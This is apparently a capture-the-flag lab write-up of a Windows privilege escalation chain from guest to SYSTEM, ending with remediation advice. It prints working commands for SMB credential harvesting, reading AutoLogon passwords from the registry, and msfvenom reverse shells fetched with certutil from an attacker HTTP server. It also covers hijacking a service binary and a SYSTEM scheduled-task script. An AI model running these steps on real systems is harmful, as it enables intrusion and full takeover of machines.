## Lab Summary

The objective of this room was to move through a chained Windows privilege escalation path, beginning with guest-level access and ending with a shell as `NT AUTHORITY\SYSTEM`.

Final compromise chain:

```text
guest -> thmuser -> notadmin -> svcadmin -> SYSTEM
```

Confirmed lab details:

```text
Target IP: 10.130.190.161
Kali tun0 IP: 192.168.129.186
Attacker working directory: /tmp/VK/
```

## Tools Used

The main tools used were:

- `nmap` for initial service discovery.
- `smbclient` for anonymous SMB enumeration.
- `xfreerdp3` for Remote Desktop access.
- `Evil-WinRM` for testing WinRM authentication.
- Windows command-line utilities including `whoami`, `reg`, `runas`, `sc`, `icacls`, `schtasks`, `wmic`, `cmdkey` and `certutil`.
- `msfvenom` for generating Windows reverse-shell payloads.
- Python's built-in HTTP server for payload transfer.
- `Penelope` for handling reverse-shell sessions.

## Initial Enumeration

The first step was to identify exposed services on the target.

```bash
cd /tmp/VK
nmap -Pn -sC -sV -oA windows-jump-initial 10.130.190.161
```

Important results:

```text
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  http
```

The target exposed SMB, RDP and WinRM. SMB signing was enabled but not required.

## Guest Access Through SMB

Anonymous SMB enumeration revealed a custom share named `Public`.

```bash
smbclient -L //10.130.190.161 -N
```

Relevant output:

```text
Sharename       Type      Comment
---------       ----      -------
Public          Disk      Public file share
```

The share was accessible without credentials.

```bash
smbclient //10.130.190.161/Public -N
```

Inside the SMB session:

```text
ls
more welcome.txt
```

The `welcome.txt` file exposed default employee credentials:

```text
Username: thmuser
Password: <REDACTED>
```

This was the first security weakness: unauthenticated users could retrieve valid local credentials from a publicly accessible SMB share.

## thmuser Access

WinRM accepted the connection initially but rejected command execution, so RDP was used instead.

```bash
xfreerdp3 /v:10.130.190.161 /u:thmuser /p:'<REDACTED>' /cert:ignore /dynamic-resolution +clipboard
```

After logging in, a Command Prompt was opened and the current identity was confirmed:

```cmd
whoami
```

Output:

```text
privesc\thmuser
```

The first flag was located in the original `thmuser` profile:

```cmd
dir C:\Users\thmuser /s /b | findstr /i flag1.txt
type C:\Users\thmuser\Desktop\flag1.txt
```

Flag:

```text
THM{....}
```

## Local Enumeration as thmuser

The current token contained only standard privileges:

```cmd
whoami /groups
whoami /priv
```

No useful impersonation, backup or debug privileges were available.

Stored credentials were also checked:

```cmd
cmdkey /list
```

No useful credentials were present.

The PowerShell history file was absent:

```cmd
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

The system-wide Winlogon registry configuration was then inspected:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

This exposed clear-text AutoLogon credentials:

```text
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    notadmin
DefaultPassword   REG_SZ    <REDACTED>
```

This provided the next account in the escalation chain.

## thmuser to notadmin

A new Command Prompt was launched with the exposed credentials:

```cmd
runas /user:PRIVESC\notadmin cmd.exe
```

Password entered:

```text
<REDACTED>
```

The new context was confirmed:

```cmd
whoami
```

Output:

```text
privesc\notadmin
```

The second flag was then read:

```cmd
type C:\Users\notadmin\Desktop\flag2.txt
```

Flag:

```text
THM{....}
```

The weakness here was the storage of a local account password in clear text under the Winlogon registry key.

## Enumeration as notadmin

The `notadmin` account also had only standard token privileges:

```cmd
whoami /priv
```

Service enumeration identified a custom service:

```cmd
wmic service get name,pathname,startname | findstr /i "svcadmin"
```

Relevant output:

```text
THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin
```

The service configuration was inspected:

```cmd
sc qc THMSvc
```

Relevant output:

```text
SERVICE_NAME: THMSvc
BINARY_PATH_NAME: C:\Windows\THMSVC\svc.exe
START_TYPE: 3 DEMAND_START
SERVICE_START_NAME: .\svcadmin
```

Permissions on the service directory were then checked:

```cmd
icacls C:\Windows\THMSVC\
```

Relevant output:

```text
PRIVESC\notadmin:(OI)(CI)(F)
BUILTIN\Administrators:(OI)(CI)(F)
NT AUTHORITY\SYSTEM:(OI)(CI)(F)
```

The `notadmin` account had Full Control over the directory containing a service executable that ran as `svcadmin`.

## notadmin to svcadmin

The original service binary was backed up:

```cmd
copy C:\Windows\THMSVC\svc.exe C:\Windows\THMSVC\svc.exe.bak
```

On Kali, a service-compatible reverse-shell executable was created:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.129.186 LPORT=4444 -f exe-service -o /tmp/VK/svc.exe
```

A temporary HTTP server was started:

```bash
cd /tmp/VK
python3 -m http.server 8000
```

From the `notadmin` shell, the payload replaced the original service binary:

```cmd
certutil -urlcache -split -f http://192.168.129.186:8000/svc.exe C:\Windows\THMSVC\svc.exe
```

A Penelope listener was started on Kali:

```bash
penelope -p 4444
```

The service was then started:

```cmd
sc start THMSvc
```

The callback arrived as:

```text
privesc\svcadmin
```

The third flag was read:

```cmd
type C:\Users\svcadmin\Desktop\flag3.txt
```

Flag:

```text
THM{....}
```

This escalation succeeded because a lower-privileged user could replace the executable used by a service running as a more privileged account.

## Enumeration as svcadmin

The `svcadmin` token did not expose useful impersonation or backup privileges:

```cmd
whoami /priv
```

The `C:\Windows\Tasks` directory contained a batch file:

```cmd
cd C:\Windows\Tasks
dir
type cleanup.bat
```

Original contents:

```bat
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
```

Permissions showed that `svcadmin` could modify the file:

```cmd
icacls C:\Windows\Tasks\cleanup.bat
```

Relevant output:

```text
PRIVESC\svcadmin:(I)(M)
BUILTIN\Administrators:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
```

The writable batch file was executed by a scheduled task running as `SYSTEM`, creating the final privilege escalation opportunity.

## svcadmin to SYSTEM

A standard Windows reverse-shell executable was generated on Kali:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.129.186 LPORT=5555 -f exe -o /tmp/VK/shell.exe
```

The payload was downloaded to the target:

```cmd
certutil -urlcache -split -f http://192.168.129.186:8000/shell.exe C:\Windows\Tasks\shell.exe
```

The writable batch file was replaced so that it launched the payload:

```cmd
echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat
```

A second Penelope listener was started:

```bash
penelope -p 5555
```

When the scheduled task executed, a new reverse shell connected back. The final context was confirmed:

```cmd
whoami
```

Output:

```text
nt authority\system
```

The final flag was located at the root of the system drive:

```cmd
type C:\flag4.txt
```

Flag:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. guest to thmuser

Anonymous SMB access exposed `welcome.txt`, which contained default credentials for `thmuser`.

### 2. thmuser to notadmin

The Winlogon registry stored clear-text AutoLogon credentials for `notadmin`.

### 3. notadmin to svcadmin

`notadmin` had Full Control over the `THMSvc` service directory. Replacing the service executable and starting the service produced a shell as `svcadmin`.

### 4. svcadmin to SYSTEM

`svcadmin` could modify `C:\Windows\Tasks\cleanup.bat`. The batch file was executed by a scheduled task running as `SYSTEM`. Replacing its contents with a reverse-shell launcher produced a shell as `NT AUTHORITY\SYSTEM`.

## Key Lessons

This room demonstrated several common Windows security failures:

- Public SMB shares can expose credentials and sensitive operational information.
- Default passwords should never be stored in accessible files.
- AutoLogon credentials stored in the registry can expose clear-text passwords.
- Service executable directories must not be writable by lower-privileged users.
- Writable scripts or batch files executed by scheduled tasks create direct privilege escalation paths.
- File permissions must be reviewed together with the account context in which a service or task executes.
- Obtaining credentials is not always the same as obtaining an interactive session; account rights such as RDP access may still be restricted.
- Windows privilege escalation often depends on chaining several individually simple misconfigurations.

## Remediation Notes

The weaknesses identified in this room could be mitigated by:

- Removing anonymous access from SMB shares unless there is a documented business requirement.
- Never storing passwords in public files, scripts or deployment notes.
- Removing clear-text `DefaultPassword` values from the Winlogon registry.
- Using managed service accounts or other protected credential mechanisms for services.
- Restricting write access to service binaries and their parent directories.
- Ensuring only administrators and `SYSTEM` can modify files executed by privileged services or scheduled tasks.
- Reviewing scheduled-task actions and permissions regularly.
- Rotating credentials immediately after suspected exposure.
- Applying least privilege to local users, service accounts and remote access groups.
- Monitoring changes to service binaries, scheduled-task scripts and sensitive registry keys.
